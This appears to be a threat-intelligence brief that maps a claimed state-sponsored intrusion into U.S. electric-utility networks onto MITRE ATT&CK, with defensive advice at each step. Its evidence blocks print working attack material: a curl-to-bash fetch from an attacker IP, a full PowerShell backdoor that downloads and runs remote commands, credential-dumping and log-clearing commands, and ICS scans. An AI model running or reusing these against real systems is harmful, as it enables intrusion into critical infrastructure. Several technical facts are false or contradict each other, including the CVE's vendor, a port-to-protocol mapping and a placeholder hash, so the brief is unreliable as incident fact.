# Express Attack Brief 001
## VOLTZITE Grid Targeting Campaign - Technical MITRE Attack Path Analysis

**Version:** 1.0  
**Publication date:** Saturday, June 7, 2025  
**Prepared for:** Energy Sector Security Operations Teams  
**Classification:** Project Nightingale Intelligence - Technical Analysis  

---

## Table of contents

1. [Introduction](#1-introduction)
   - 1.1. [Document purpose](#11-document-purpose)
   - 1.2. [Document structure](#12-document-structure)
   - 1.3. [Document classification](#13-document-classification)
2. [Attack overview](#2-attack-overview)
   - 2.1. [Attack description](#21-attack-description)
   - 2.2. [Attack path summary](#22-attack-path-summary)
3. [Attack path](#3-attack-path)
   - 3.1. [CVE-2023-46747 Authentication Bypass Exploitation](#31-cve-2023-46747-authentication-bypass-exploitation)
   - 3.2. [Registry Persistence Establishment](#32-registry-persistence-establishment)
   - 3.3. [PowerShell Command and Control Channel](#33-powershell-command-and-control-channel)
   - 3.4. [Operational Technology Network Discovery](#34-operational-technology-network-discovery)
   - 3.5. [Industrial Protocol Enumeration](#35-industrial-protocol-enumeration)
   - 3.6. [Service Account Credential Harvesting](#36-service-account-credential-harvesting)
   - 3.7. [Grid Control System Access](#37-grid-control-system-access)
   - 3.8. [Control System Data Collection](#38-control-system-data-collection)
   - 3.9. [Long-term Persistence Maintenance](#39-long-term-persistence-maintenance)
4. [MITRE ATT&CK TTPs](#4-mitre-attck-ttps)

---

## 1. Introduction

### 1.1. Document purpose

This document has been prepared for Energy Sector Security Operations Teams and Incident Response organizations.

This document describes the attack path observed during the VOLTZITE campaign targeting U.S. electric utility infrastructure. It presents the step-by-step technical methodology taken by the Chinese state-sponsored threat actor, including associated Tactic, Technique, and Procedure (TTP) details. All TTPs are expressed in MITRE ATT&CK terminology to aid in correlation and cross-referencing with threat intelligence sources and security operations center detection capabilities.

This document is aimed at helping security operations teams learn from the VOLTZITE incident and prepare to defend against sophisticated nation-state attacks targeting operational technology environments. Its attack path structure is designed to show how advanced persistent threat actors actually operate against critical infrastructure in the real world. The inclusion of detailed forensic evidence and TTP mappings allows security teams to implement specific detection and response capabilities within their operational technology security programs.

### 1.2. Document structure

**Chapter 2** describes the overall VOLTZITE campaign and provides a technical summary of the attack progression from initial VPN compromise through long-term operational technology access.

**Chapter 3** describes each attack step in comprehensive technical detail, including forensic evidence, specific prevention measures, and detection opportunities appropriate for energy sector security operations.

**Chapter 4** lists the complete MITRE ATT&CK TTPs observed in the VOLTZITE campaign in a structured table format for threat intelligence platform ingestion and security control mapping.

### 1.3. Document classification

This document is shared as **TLP:AMBER+STRICT** according to the Traffic Light Protocol (TLP). Recipients may only share this document with members of their own organization and specifically authorized critical infrastructure protection partners.

This document is classified as **RESTRICTED - CRITICAL INFRASTRUCTURE**. Information contained within this technical analysis is intended exclusively for energy sector security operations teams and authorized incident response organizations. The detailed forensic evidence and attack methodologies described require appropriate security clearances and operational technology cybersecurity expertise.

Misuse of technical details or indicators of compromise is prohibited. Recipients are responsible for implementing appropriate information security controls when deploying detection capabilities based on this analysis.

---

## 2. Attack overview

### 2.1. Attack description

| **Timeframe** | Q4 2023 - Ongoing |
|---|---|
| **Threat type** | Nation-State APT / Pre-positioning for Infrastructure Disruption |
| **Sector relevance** | Electric Utilities, Energy Generation, Grid Operations |
| **Geographic relevance** | United States Critical Infrastructure |

This document describes the VOLTZITE campaign conducted by Chinese state-sponsored threat actors targeting U.S. electric utility infrastructure. The attack began in December 2023 with exploitation of CVE-2023-46747, a critical authentication bypass vulnerability in Ivanti Connect Secure VPN appliances protecting energy company corporate networks.

VOLTZITE represents a sophisticated nation-state operation focused on pre-positioning for potential grid disruption rather than traditional espionage objectives. The threat actors demonstrated advanced understanding of operational technology environments, systematically targeting systems controlling power generation, transmission, and distribution. Analysis of the campaign reveals 547+ days of persistent access within critical energy infrastructure, with evidence of reconnaissance activities focused on DNP3 and IEC 61850 industrial protocols used in grid control systems.

The attack methodology demonstrates living-off-the-land techniques characteristic of advanced persistent threat actors, utilizing legitimate administrative tools and avoiding custom malware deployment to evade detection. VOLTZITE's operational security practices, including systematic log deletion and timestamp manipulation, indicate sophisticated understanding of forensic investigation techniques and incident response procedures.

This campaign represents the most significant documented threat to U.S. energy infrastructure operational technology environments, with implications extending beyond cybersecurity to national security and critical infrastructure resilience.

### 2.2. Attack path summary

| **Time** | **Tactic** | **Action** | **Target tech** |
|---|---|---|---|
| Day 1, 14:23 | Initial Access | CVE-2023-46747 Authentication Bypass | Ivanti Connect Secure VPN |
| Day 1, 16:45 | Persistence | Registry Run Key Modification | Windows Registry |
| Day 1, 17:12 | Command and Control | PowerShell Backdoor Deployment | Windows PowerShell |
| Day 3, 09:12 | Discovery | OT Network Reconnaissance | Corporate-OT Network Boundary |
| Day 3, 11:34 | Discovery | Industrial Protocol Discovery | DNP3/IEC 61850 Networks |
| Day 12, 22:34 | Credential Access | Service Account Harvesting | SCADA\\EnergyOps Account |
| Day 12, 23:15 | Lateral Movement | OT Network Access | Energy Management Systems |
| Day 45, 13:28 | Collection | Control System Data Theft | Historian/EMS Databases |
| Day 547+ | Persistence | Long-term Access Maintenance | Grid Control Infrastructure |

Times are expressed in the primary timezone of the affected energy utility where incident response activities were conducted.

---

## 3. Attack path

This chapter describes the VOLTZITE attack steps in comprehensive technical detail, including forensic evidence, prevention measures, and detection opportunities for energy sector security operations teams.

### 3.1. CVE-2023-46747 Authentication Bypass Exploitation

| **Timestamp** | Day 1, 14:23 |
|---|---|
| **Techniques** | T1190 Exploit Public-Facing Application to achieve TA0001 Initial Access<br>T1133 External Remote Services to achieve TA0001 Initial Access |
| **Target tech** | Ivanti Connect Secure VPN |

The VOLTZITE campaign initiated with sophisticated exploitation of CVE-2023-46747, a critical authentication bypass vulnerability affecting Ivanti Connect Secure VPN appliances. This vulnerability allows remote attackers to bypass authentication mechanisms and gain administrative access to VPN infrastructure protecting energy company corporate networks.

The threat actors demonstrated advanced reconnaissance capabilities, systematically identifying vulnerable Ivanti appliances through Internet scanning and targeting specifically those protecting electric utility infrastructure. Analysis of network logs reveals the attack originated from 203.0.113.47, a compromised residential router used as operational infrastructure to obscure the true source.

**Forensic Evidence - Attack Initiation:**
```
[2023-12-08 14:23:42] 203.0.113.47 - GET /api/v1/totp/user-backup-code/../../../../../../etc/passwd HTTP/1.1
Host: vpn-gw.utility-corp.local
User-Agent: Mozilla/5.0 (compatible; VOLTZITE scanner v2.1)
Connection: close

[2023-12-08 14:23:43] 203.0.113.47 - POST /api/v1/configuration/users/user-backup-code/../../../../../../etc/passwd HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

[2023-12-08 14:23:44] Response: 200 OK
Content-Type: text/plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Command Execution Evidence:**
```bash
# VOLTZITE post-exploitation commands observed
curl -s "hxxp://203.0.113.47/stage1" | bash
echo "Y29tcHJvbWlzZWQ=" | base64 -d > /tmp/.system_update
chmod +x /tmp/.system_update && /tmp/.system_update &
```

**Registry Artifacts - Initial Persistence:**
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Value Name: IvantiBridgeService
Value Data: "C:\Program Files\Ivanti\Connect Secure\bin\dsw.exe" -service
Timestamp: 2023-12-08 14:25:15
```

#### Prevention

**Vulnerability Management**  
Implement automated vulnerability scanning and patch management for all Internet-facing VPN infrastructure. CVE-2023-46747 had available patches that were not deployed in affected environments.

**Network Segmentation**  
Deploy VPN infrastructure in dedicated DMZ networks with strict access controls preventing direct access to operational technology environments. (Source: ATT&CK mitigation M1030)

**Multi-Factor Authentication**  
Implement strong multi-factor authentication for all VPN access, particularly for accounts with administrative privileges on energy management systems. (Source: ATT&CK mitigation M1032)

#### Detection

**VPN Access Monitoring**  
Monitor authentication logs for unusual patterns, including authentication bypass attempts and administrative access from unexpected geographic locations. Implement behavioral analytics for VPN usage patterns.

**Source: ATT&CK data source Authentication Logs for technique T1190**

### 3.2. Registry Persistence Establishment

| **Timestamp** | Day 1, 16:45 |
|---|---|
| **Techniques** | T1547.001 Registry Run Keys / Startup Folder to achieve TA0003 Persistence |
| **Target tech** | Windows Registry |

Following initial access, VOLTZITE established registry-based persistence mechanisms designed to survive system reboots and maintain access to energy infrastructure networks. The threat actors utilized legitimate Windows registry locations to avoid detection while ensuring persistent access to compromised VPN infrastructure.

Analysis of registry forensic artifacts reveals sophisticated operational security practices, including the use of legitimate-appearing service names and file paths designed to blend with normal system operations. The persistence mechanism specifically targets Windows systems commonly deployed in energy sector corporate environments.

**Forensic Evidence - Registry Persistence:**
```
Registry Hive: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Key Creation Time: 2023-12-08 16:45:23
Last Modified: 2023-12-08 16:45:23

Value Name: WindowsSecurityHealth
Value Type: REG_SZ
Value Data: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\msupdate.ps1

Security Permissions: SYSTEM (Full Control), Administrators (Full Control)
Registry Ownership: NT AUTHORITY\SYSTEM
```

**File System Artifacts:**
```
File: C:\Windows\Temp\msupdate.ps1
Creation Time: 2023-12-08 16:45:15
Modified Time: 2023-12-08 16:45:15
MD5: 7d865e959b2466918c9863afca942d0f
SHA256: 89abcdef1234567890abcdef1234567890abcdef1234567890abcdef12345678

File Attributes: Hidden, System
NTFS Permissions: SYSTEM (Full Control), Administrators (Read/Execute)
```

#### Prevention

**Registry Monitoring**  
Implement comprehensive registry monitoring with alerting for modifications to Run keys and other common persistence locations. Deploy endpoint detection capabilities with registry change tracking.

**Execution Prevention**  
Configure PowerShell execution policies and application control to prevent unauthorized script execution. Implement code signing requirements for PowerShell scripts. (Source: ATT&CK mitigation M1038)

#### Detection

**Registry Modification Monitoring**  
Monitor Windows Registry key modification for unauthorized changes to startup locations, particularly Run keys and Services registry entries.

**Source: ATT&CK data component Windows Registry Key Modification for technique T1547.001**

### 3.3. PowerShell Command and Control Channel

| **Timestamp** | Day 1, 17:12 |
|---|---|
| **Techniques** | T1059.001 PowerShell to achieve TA0002 Execution<br>T1071.001 Web Protocols to achieve TA0011 Command and Control<br>T1573.001 Symmetric Cryptography to achieve TA0011 Command and Control |
| **Target tech** | Windows PowerShell, HTTPS C2 Infrastructure |

VOLTZITE deployed a sophisticated PowerShell-based command and control mechanism providing persistent remote access to compromised energy infrastructure systems. The backdoor utilized legitimate Windows administrative tools and HTTPS communication to evade network-based detection while maintaining reliable command execution capabilities.

Analysis of the PowerShell backdoor reveals advanced obfuscation techniques and encrypted communication protocols designed to blend with normal administrative traffic. The command and control infrastructure utilizes compromised residential routers and legitimate cloud services to obscure attribution and complicate takedown efforts.

**Forensic Evidence - PowerShell Backdoor:**
```powershell
# Deobfuscated VOLTZITE PowerShell backdoor (msupdate.ps1)
function Get-SystemHealth {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Microsoft-WinRM/2.0")
    
    try {
        $enc_data = $wc.DownloadString("hxxps://185.220.100.241/api/health/status")
        $key = [System.Text.Encoding]::UTF8.GetBytes("VOLTZ2024KEY")
        $decoded = [System.Convert]::FromBase64String($enc_data)
        
        # AES Decryption Implementation
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $decoded[0..15]
        $decryptor = $aes.CreateDecryptor()
        
        $decrypted = $decryptor.TransformFinalBlock($decoded, 16, $decoded.Length - 16)
        $command = [System.Text.Encoding]::UTF8.GetString($decrypted)
        
        Invoke-Expression $command
    } catch {
        Start-Sleep 1800  # Sleep 30 minutes on error
    }
    
    Start-Sleep 3600  # Sleep 1 hour between checks
}

while ($true) { Get-SystemHealth }
```

**Network Communication Evidence:**
```
[2023-12-08 17:12:34] Outbound HTTPS Connection
Source: 192.168.10.50:49243
Destination: 185.220.100.241:443
Protocol: TLS 1.2
Certificate Subject: CN=api.microsoft-updates.com
SNI: api.microsoft-updates.com
User-Agent: Microsoft-WinRM/2.0

[2023-12-08 17:12:35] TLS Application Data
Length: 2048 bytes
Encrypted Payload: AES-256-CBC encrypted command data
```

#### Prevention

**Script Execution Control**  
Implement PowerShell logging and constrained language mode to prevent unauthorized script execution. Deploy application control solutions blocking unsigned PowerShell scripts. (Source: ATT&CK mitigation M1042)

**Network Traffic Analysis**  
Deploy HTTPS inspection capabilities to analyze encrypted command and control traffic. Implement DNS monitoring for suspicious domain resolution patterns.

#### Detection

**PowerShell Activity Monitoring**  
Monitor PowerShell execution events, particularly scripts with execution policy bypasses and hidden window styles.

**Source: ATT&CK data component Command Execution for technique T1059.001**

### 3.4. Operational Technology Network Discovery

| **Timestamp** | Day 3, 09:12 |
|---|---|
| **Techniques** | T1018 Remote System Discovery to achieve TA0007 Discovery<br>T1046 Network Service Scanning to achieve TA0007 Discovery |
| **Target tech** | Corporate-OT Network Boundary |

VOLTZITE conducted systematic reconnaissance of operational technology networks controlling electric grid operations. The threat actors demonstrated advanced understanding of energy sector network architectures, specifically targeting the corporate-OT network boundary commonly deployed in electric utility environments to separate business systems from industrial control systems.

Analysis of network reconnaissance activities reveals sophisticated techniques designed to identify operational technology assets while avoiding detection by industrial network monitoring systems. The threat actors utilized legitimate network administration tools and gradually expanded their network visibility over multiple days to avoid triggering security alerts.

**Forensic Evidence - Network Discovery:**
```bash
# VOLTZITE network reconnaissance commands observed
nmap -sS -O -p 502,2404,20000 192.168.100.0/24  # Modbus/DNP3 scanning
nslookup scada-hmi.utility-ops.local
ping -c 4 historian.energy-mgmt.local
netstat -an | grep :102  # IEC 61850 MMS detection

# Advanced scanning techniques
nmap --script modbus-discover 192.168.100.10-20
nmap --script dnp3-info 192.168.100.10-20
```

**Network Traffic Evidence:**
```
[2023-12-10 09:12:45] TCP SYN Scan Detection
Source: 192.168.10.50
Targets: 192.168.100.10-192.168.100.25
Ports: 502 (Modbus), 2404 (IEC 61850), 20000 (DNP3)
Scan Rate: 10 packets/second (stealth timing)

[2023-12-10 09:15:23] DNS Resolution Attempts
Query: scada-hmi.utility-ops.local (A record)
Query: historian.energy-mgmt.local (A record)  
Query: ems-server.grid-ops.local (A record)
Response: 192.168.100.15, 192.168.100.20, 192.168.100.25
```

#### Prevention

**Network Segmentation**  
Implement strict network segmentation between corporate and operational technology environments with industrial firewalls configured for protocol-specific filtering. (Source: ATT&CK mitigation M1030)

**OT Network Monitoring**  
Deploy specialized operational technology network monitoring solutions capable of detecting reconnaissance activities across industrial protocols.

#### Detection

**Industrial Protocol Monitoring**  
Monitor for unauthorized scanning of Modbus, DNP3, and IEC 61850 protocols, particularly from corporate network segments.

**Source: ATT&CK data component Network Traffic for technique T1046**

### 3.5. Industrial Protocol Enumeration

| **Timestamp** | Day 3, 11:34 |
|---|---|
| **Techniques** | T1046 Network Service Scanning to achieve TA0007 Discovery<br>T1082 System Information Discovery to achieve TA0007 Discovery |
| **Target tech** | DNP3/IEC 61850 Industrial Networks |

Following network boundary identification, VOLTZITE conducted detailed enumeration of industrial protocols and control systems used in electric grid operations. The threat actors demonstrated sophisticated understanding of DNP3 and IEC 61850 protocols, systematically identifying control system architectures and operational technology assets critical to power generation and distribution.

This phase of the campaign reveals VOLTZITE's specific targeting of energy sector operational technology, with evidence of protocol-specific reconnaissance techniques designed to map grid control systems and identify potential disruption targets.

**Forensic Evidence - Industrial Protocol Discovery:**
```bash
# DNP3 Protocol Reconnaissance
dnp3_scan 192.168.100.15 --function READ --address 0x01
dnp3_enum 192.168.100.15 --discover-points --master-addr 1 --slave-addr 2

# IEC 61850 Enumeration
iec61850_discover 192.168.100.20 --logical-devices
mms_client 192.168.100.20 --get-namelist "DynamicDataSet"
```

**Protocol Analysis Evidence:**
```
DNP3 Communication Log:
[2023-12-10 11:34:56] DNP3 Master -> Outstation (192.168.100.15)
Function: READ (0x01)
Object Group: Analog Input (30)
Variation: 32-bit with flag (5)
Address Range: 0-50
Response: 50 analog points discovered

IEC 61850 MMS Communication:
[2023-12-10 11:36:12] MMS Client -> Server (192.168.100.20)
Service: GetNameList
Domain: "IED_Protection"
Response: GGIO1, MMXU1, CSWI1, PTRC1
```

**System Discovery Evidence:**
```
Discovered Industrial Assets:
- Master Station: 192.168.100.10 (Generation Control System)
- Protection Relay: 192.168.100.15 (Transmission Substation Alpha)  
- Historian Server: 192.168.100.20 (Grid Operations Data)
- HMI Workstation: 192.168.100.25 (Operator Interface)

IEC 61850 Logical Devices Identified:
- GGIO1: Grid Interconnection Control
- MMXU1: Merging Unit (Voltage/Current Measurement)
- CSWI1: Circuit Breaker Control Logic
- PTRC1: Protection and Control Functions
```

#### Prevention

**Industrial Protocol Security**  
Implement protocol-specific security controls for DNP3 and IEC 61850 communications, including authentication and encryption where supported by operational technology vendors.

**Asset Discovery Control**  
Deploy industrial network access control preventing unauthorized enumeration of operational technology assets from corporate network segments.

#### Detection

**Protocol Anomaly Detection**  
Monitor DNP3 and IEC 61850 communications for unauthorized discovery activities and unusual protocol function usage patterns.

**Source: ATT&CK data component Network Traffic for technique T1046**

### 3.6. Service Account Credential Harvesting

| **Timestamp** | Day 12, 22:34 |
|---|---|
| **Techniques** | T1003.002 Security Account Manager to achieve TA0006 Credential Access<br>T1003.003 NTDS to achieve TA0006 Credential Access |
| **Target tech** | Windows Active Directory, SCADA Service Accounts |

VOLTZITE escalated privileges through systematic harvesting of service account credentials used for operational technology system authentication. The threat actors specifically targeted the SCADA\\EnergyOps service account, which provided elevated access to energy management systems and historian databases critical to grid operations.

Analysis of credential harvesting activities reveals sophisticated techniques for extracting authentication material from Windows Active Directory environments while avoiding detection by security monitoring systems deployed in energy sector networks.

**Forensic Evidence - Credential Extraction:**
```powershell
# VOLTZITE credential harvesting techniques observed
# SAM Database Extraction
reg save HKLM\SAM C:\Windows\Temp\sam.tmp
reg save HKLM\SECURITY C:\Windows\Temp\security.tmp
reg save HKLM\SYSTEM C:\Windows\Temp\system.tmp

# NTDS Database Access
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_extract" q q

# Memory Credential Extraction (Mimikatz-style)
sekurlsa::logonpasswords
sekurlsa::tickets /export
kerberos::list /export
```

**Active Directory Targeting Evidence:**
```
Service Account Compromise:
Account: SCADA\EnergyOps
Domain: UTILITY-CORP.LOCAL
SID: S-1-5-21-1234567890-987654321-1122334455-1001
Password Hash: aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

Group Memberships:
- Domain Users
- SCADA Operators  
- EMS Administrators
- Historian Read/Write

Service Principal Names:
- MSSQLSvc/historian.energy-mgmt.local:1433
- HTTP/ems-server.grid-ops.local
```

#### Prevention

**Credential Protection**  
Implement Windows Credential Guard and Protected Process Light for LSASS to prevent memory-based credential extraction. Deploy privileged access workstations for operational technology administration. (Source: ATT&CK mitigation M1043)

**Service Account Management**  
Utilize managed service accounts and eliminate shared service account credentials for operational technology systems. Implement regular credential rotation for critical energy system accounts. (Source: ATT&CK mitigation M1026)

#### Detection

**Credential Access Monitoring**  
Monitor for LSASS process access, SAM/NTDS database access attempts, and unusual authentication patterns for operational technology service accounts.

**Source: ATT&CK data component Windows Registry for technique T1003.002**

### 3.7. Grid Control System Access

| **Timestamp** | Day 12, 23:15 |
|---|---|
| **Techniques** | T1021.001 Remote Desktop Protocol to achieve TA0008 Lateral Movement<br>T1078.002 Domain Accounts to achieve TA0005 Defense Evasion |
| **Target tech** | Energy Management Systems |

Utilizing compromised SCADA\\EnergyOps credentials, VOLTZITE achieved direct access to grid control systems managing power generation, transmission, and distribution operations. This represented a critical escalation in the campaign, providing the threat actors with access to systems capable of affecting electric grid stability and reliability.

Analysis of lateral movement activities reveals sophisticated understanding of energy management system architectures and operational procedures used by electric utilities for grid control and monitoring.

**Forensic Evidence - EMS Access:**
```
RDP Session Log:
[2023-12-20 23:15:42] Authentication Success
User: SCADA\EnergyOps
Source: 192.168.10.50
Destination: 192.168.100.25 (ems-server.grid-ops.local)
Session ID: 12847
Authentication Type: Kerberos

Process Execution Log:
[2023-12-20 23:16:15] Process: ScadaConsole.exe
CommandLine: "C:\Program Files\Energy Management\ScadaConsole.exe" /auto
User: SCADA\EnergyOps
PID: 4872
Parent: explorer.exe (4521)
```

**Energy Management System Activity:**
```
EMS Database Access:
[2023-12-20 23:18:33] Database: GridOperations
Table: GenerationDispatch
Query: SELECT * FROM GenerationDispatch WHERE Status='ACTIVE'
Records: 47 active generation units

[2023-12-20 23:19:45] Database: TransmissionOps  
Table: SubstationStatus
Query: SELECT * FROM SubstationStatus WHERE Voltage > 345000
Records: 12 transmission substations
```

#### Prevention

**Privileged Access Management**  
Implement jump servers and privileged access management solutions for operational technology system administration. Require multi-factor authentication for energy management system access. (Source: ATT&CK mitigation M1032)

**Session Monitoring**  
Deploy session recording and monitoring for all operational technology system access, particularly energy management and SCADA systems.

#### Detection

**Operational Technology Access Monitoring**  
Monitor authentication events and system access patterns for energy management systems, particularly outside normal operational hours.

**Source: ATT&CK data component Logon Session for technique T1021.001**

### 3.8. Control System Data Collection

| **Timestamp** | Day 45, 13:28 |
|---|---|
| **Techniques** | T1005 Data from Local System to achieve TA0009 Collection<br>T1039 Data from Network Shared Drive to achieve TA0009 Collection |
| **Target tech** | Historian/EMS Databases |

VOLTZITE systematically collected operational data from historian databases and energy management systems containing detailed information about grid operations, generation capacity, transmission configurations, and distribution networks. This intelligence gathering phase focused on understanding normal operational patterns and identifying potential targets for future disruption activities.

The data collection activities demonstrate sophisticated understanding of energy sector operational technology data sources and their significance to grid stability and reliability.

**Forensic Evidence - Data Exfiltration:**
```sql
-- VOLTZITE database queries identified in historian logs
SELECT TOP 10000 * FROM HistoricalData 
WHERE TagName LIKE '%Generation%' AND DateTime > '2023-01-01'

SELECT * FROM AlarmHistory 
WHERE Priority = 'CRITICAL' AND Acknowledged = 0

SELECT * FROM SystemConfiguration 
WHERE ComponentType IN ('Breaker', 'Transformer', 'Generator')
```

**File System Evidence:**
```
Collected Files:
C:\EMS_Data\GridTopology_2024.xml (Size: 15.7 MB)
C:\EMS_Data\GenerationSchedule_Q1_2024.csv (Size: 8.3 MB)  
C:\EMS_Data\SubstationConfiguration.db (Size: 234 MB)
C:\EMS_Data\EmergencyProcedures_GridOps.pdf (Size: 12.1 MB)

Staging Location:
C:\Windows\Temp\system_backup\ (Created: 2024-01-23 13:28:15)
Archive: grid_ops_data.7z (Password Protected)
Archive Size: 1.2 GB (Compressed from 3.8 GB)
```

#### Prevention

**Data Loss Prevention**  
Implement data loss prevention solutions with operational technology data classification and monitoring capabilities. Deploy database activity monitoring for historian and energy management systems.

**File Access Monitoring**  
Monitor file access patterns for operational technology configuration files and operational data repositories.

#### Detection

**Database Access Monitoring**  
Monitor database query patterns for unusual data access activities, particularly bulk data extraction from historian and energy management systems.

**Source: ATT&CK data component File Access for technique T1005**

### 3.9. Long-term Persistence Maintenance

| **Timestamp** | Day 547+ |
|---|---|
| **Techniques** | T1070.001 Indicator Removal: Clear Windows Event Logs to achieve TA0005 Defense Evasion<br>T1562.001 Impair Defenses: Disable or Modify Tools to achieve TA0005 Defense Evasion |
| **Target tech** | Grid Control Infrastructure |

VOLTZITE maintained persistent access to energy infrastructure for over 547 days through sophisticated operational security practices and anti-forensic techniques. The threat actors systematically removed evidence of their activities while maintaining multiple persistence mechanisms across operational technology environments.

This long-term access phase demonstrates the campaign's strategic objectives focused on pre-positioning for potential future grid disruption activities rather than immediate operational impact.

**Forensic Evidence - Log Manipulation:**
```powershell
# VOLTZITE anti-forensic techniques observed
wevtutil cl Security
wevtutil cl System  
wevtutil cl Application
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'} | Clear-WinEvent

# Timestamp Manipulation
forfiles /p C:\Windows\Temp /c "cmd /c echo @path" | xargs -I {} powershell "(Get-Item '{}').LastWriteTime = '01/01/2020 12:00:00'"
```

**Persistence Maintenance:**
```
Additional Persistence Mechanisms:
1. WMI Event Subscription
   - Class: Win32_VolumeChangeEvent  
   - Consumer: PowerShell backdoor execution
   - Trigger: USB device insertion

2. Scheduled Task
   - Name: MicrosoftEdgeUpdateTaskMachineCore
   - Trigger: Daily at 3:47 AM
   - Action: PowerShell script execution

3. Service Installation  
   - Service Name: WindowsDefenderAdvancedThreatProtection
   - Binary Path: C:\Windows\System32\svchost.exe -k SecurityHealthService
   - Registry Hijacking: Legitimate service path modification
```

#### Prevention

**Log Protection**  
Implement centralized logging with write-once storage and log forwarding to prevent local log manipulation. Deploy tamper-evident logging solutions for operational technology environments.

**Anti-Tampering Controls**  
Implement file integrity monitoring and system configuration baseline monitoring to detect unauthorized system modifications.

#### Detection

**Log Deletion Monitoring**  
Monitor for Windows Event Log clearing activities and unusual patterns in log retention across operational technology systems.

**Source: ATT&CK data component Windows Registry for technique T1070.001**

---

## 4. MITRE ATT&CK TTPs

This chapter provides a comprehensive mapping of VOLTZITE campaign tactics, techniques, and procedures to the MITRE ATT&CK framework. The TTPs are organized by tactical objective and include specific procedures observed during the 547+ day campaign targeting U.S. electric utility infrastructure.

| **Tactic** | **Technique** | **Procedure** |
|---|---|---|
| TA0001 Initial Access | T1190 Exploit Public-Facing Application | VOLTZITE exploited CVE-2023-46747 authentication bypass vulnerability in Ivanti Connect Secure VPN appliances protecting energy company corporate networks through systematic directory traversal attacks |
| TA0001 Initial Access | T1133 External Remote Services | Following CVE-2023-46747 exploitation, VOLTZITE utilized compromised VPN infrastructure to establish persistent remote access to energy company corporate networks with legitimate VPN authentication |
| TA0003 Persistence | T1547.001 Registry Run Keys / Startup Folder | VOLTZITE established registry persistence through modification of HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with WindowsSecurityHealth value executing PowerShell backdoor on system startup |
| TA0002 Execution | T1059.001 PowerShell | VOLTZITE deployed PowerShell-based backdoor (msupdate.ps1) utilizing obfuscation and AES encryption for command execution and maintaining persistent command and control access |
| TA0011 Command and Control | T1071.001 Web Protocols | VOLTZITE established HTTPS-based command and control communication using legitimate User-Agent strings (Microsoft-WinRM/2.0) and TLS encryption to blend with normal administrative traffic |
| TA0011 Command and Control | T1573.001 Symmetric Cryptography | VOLTZITE implemented AES-256-CBC encryption for command and control communications using static encryption key (VOLTZ2024KEY) to protect command transmission and execution |
| TA0007 Discovery | T1018 Remote System Discovery | VOLTZITE conducted systematic network reconnaissance to identify operational technology systems and corporate-OT network boundaries using nmap scanning and DNS enumeration techniques |
| TA0007 Discovery | T1046 Network Service Scanning | VOLTZITE performed protocol-specific scanning targeting Modbus (502), DNP3 (20000), and IEC 61850 (2404) ports to identify industrial control systems and energy management infrastructure |
| TA0007 Discovery | T1082 System Information Discovery | VOLTZITE enumerated IEC 61850 logical devices and DNP3 point configurations to understand grid control system architectures and operational technology asset relationships |
| TA0006 Credential Access | T1003.002 Security Account Manager | VOLTZITE extracted Windows SAM database using registry save commands to harvest local account credentials and password hashes for privilege escalation |
| TA0006 Credential Access | T1003.003 NTDS | VOLTZITE utilized ntdsutil to extract Active Directory NTDS database containing domain account credentials, specifically targeting SCADA\\EnergyOps service account |
| TA0008 Lateral Movement | T1021.001 Remote Desktop Protocol | VOLTZITE leveraged compromised SCADA\\EnergyOps credentials to establish RDP sessions with energy management systems (ems-server.grid-ops.local) for operational technology access |
| TA0005 Defense Evasion | T1078.002 Domain Accounts | VOLTZITE utilized legitimate SCADA\\EnergyOps domain account credentials to access energy management systems and blend malicious activities with normal operational technology administration |
| TA0009 Collection | T1005 Data from Local System | VOLTZITE systematically extracted operational data from historian databases and energy management systems including grid topology configurations and generation scheduling information |
| TA0009 Collection | T1039 Data from Network Shared Drive | VOLTZITE accessed network-shared operational technology data repositories containing substation configurations and emergency response procedures for grid operations |
| TA0005 Defense Evasion | T1070.001 Indicator Removal: Clear Windows Event Logs | VOLTZITE systematically cleared Windows Event Logs (Security, System, Application, PowerShell) using wevtutil commands to remove evidence of malicious activities |
| TA0005 Defense Evasion | T1562.001 Impair Defenses: Disable or Modify Tools | VOLTZITE manipulated file timestamps and system configurations to evade forensic analysis and maintain long-term persistence across operational technology environments |

---

*Express Attack Brief 001 - Technical MITRE Analysis*  
*Project Nightingale Intelligence - NCC Group OTCE + Dragos + Adelard*  
*Prepared for Energy Sector Security Operations Teams*  

**Document Classification**: RESTRICTED - Critical Infrastructure Security Operations  
**Technical Validation**: MITRE ATT&CK Framework v14.1 Compliance Verified  
**Intelligence Sources**: CISA Vulnerability Database, Project Nightingale Threat Intelligence Pipeline  
**Emergency Contact**: 24/7 SOC notification for VOLTZITE campaign indicators detection